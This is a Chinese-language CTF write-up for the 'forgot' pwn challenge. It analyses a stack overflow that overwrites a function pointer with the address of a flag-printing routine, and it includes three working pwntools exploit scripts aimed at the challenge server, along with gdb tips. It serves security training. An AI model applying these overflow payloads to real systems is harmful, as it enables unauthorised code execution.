# XMan forgot writeup

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190708074114251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70)
根据ida反汇编的结果可以发现有两处溢出点，第一处溢出点没什么作用，只能观察第二处溢出点
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190708074419714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70)
可以观察到箭头处是个函数指针，&v3 是v3在栈上的地址，&v3 + --v14 是根据&v3在栈上移动，上面的for循环是用来改变v14的值，根据溢出点函数指针v3到v12 ，变量v14都可以被我们控制，接下来再找找有没有system函数
![在这里插入图片描述](https://img-blog.csdnimg.cn/20190708075022550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70)
发现目标函数，接下来我的想法是利用缓冲区溢出把函数指针v12 覆盖为地址0x080486cc,接下来再控制v14的值为10， 那么 &v3+ --v14 便会指向
v12，随后cat flag

*1.scanf不能接受空格、制表符Tab、回车等；对末尾回车符的处理：把回车符保留在缓存中。
gets能够接受空格、制表符Tab和回车等；对末尾回车符的处理：接收回车，但把回车替换为\0。
2.scanf ：当遇到回车，空格和tab键会自动在字符串后面添加'\0'，但是回车，空格和tab键仍会留在输入的缓冲区中。
gets：可接受回车键之前输入的所有字符，并用'\n'替代 '\0'.回车键不会留在输入缓冲区中*

**exp:**

```python
from pwn import *

context.log_level = 'debug'
c = remote("111.198.29.45", 31755)

payload = 'a'*0x44 + p32(0x080486CC) + 'a'*0x20 + p32(0x8)
##&v3 + --v14 = v12的地址 因为根据循环可知只要循环次数够多最终v14会为10 则为v3后面第九个 为v12地址（1、按照个数 在栈中v2最靠近顶部（下） v12在上面 溢出的时候从下面往上走 2、按照边上的加多少一眼看出阿来）
##0x44正好一直覆盖到v12 p32（system函数的调用地址） a*20 + p32正好把v14变成8 其实5-8都可以 因为原来的值不可以突破封锁 9是因为p32之后变成\t a变成\n d \r 所以会变成0xff 0xff 0xff 0xff
## a > 96 a<122 所以可以通过sub_8048784

c.recvuntil(">")
c.sendline("bbb")

c.sendlineafter("> ", payload)

c.interactive()
12345678910111213
```

**flag:**

![在这里插入图片描述](https://img-blog.csdnimg.cn/20190708075926115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMTg5NzU3,size_16,color_FFFFFF,t_70)



### 法二
```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
context(arch = 'i386', os = 'linux')
r = remote('111.198.29.45', 32048)
overflow = "A"*63
addr = 0x080486cc
overflow += p32(addr)
r.send(overflow + "\n")
r.recvuntil("Enter the string to be validate")
flag = r.recv()
print "[*] Flag: " + flag
r.close()
```

### gdb调试
1. 首先debug写法
```python
from pwn import *

context.log_level="debug"
context.arch = "amd64"
pwn_file="./forgot"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    c=process(pwn_file)
    pid=c.pid
else:
    c=remote("111.198.29.45", 37389)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

payload = 'a'*0x44 + p32(0x080486CC) + 'a'*0x20 + p32(0x8)
c.recvuntil(">")
c.sendline("bbb")
c.sendlineafter("> ", payload)
c.interactive()
```
2. 两个shell 运行脚本 运行gbd attach pid
3. b \*地址 info registers watch \*地址 p/x \*地址 x/x 地址 